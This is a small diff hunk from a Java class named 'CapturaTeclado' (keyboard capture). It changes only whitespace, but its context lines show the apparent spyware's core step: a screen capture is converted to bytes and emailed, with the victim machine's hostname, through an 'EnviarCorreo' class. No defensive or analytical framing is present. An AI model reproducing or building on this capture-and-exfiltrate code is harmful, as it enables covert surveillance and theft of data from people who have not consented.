@@ -46,7 +46,7 @@ public class CapturaTeclado {
 						//ImageIO.write(image, "jpg", new File("foto.jpg"));//Escribe en ruta local
 						byte[] byteImage = baos.toByteArray();
 						baos.flush();
-						baos.close();
+						baos.close();						
 						new EnviarCorreo(byteImage,InetAddress.getLocalHost().getHostName());
 					} catch (AWTException e) {
 						e.printStackTrace();
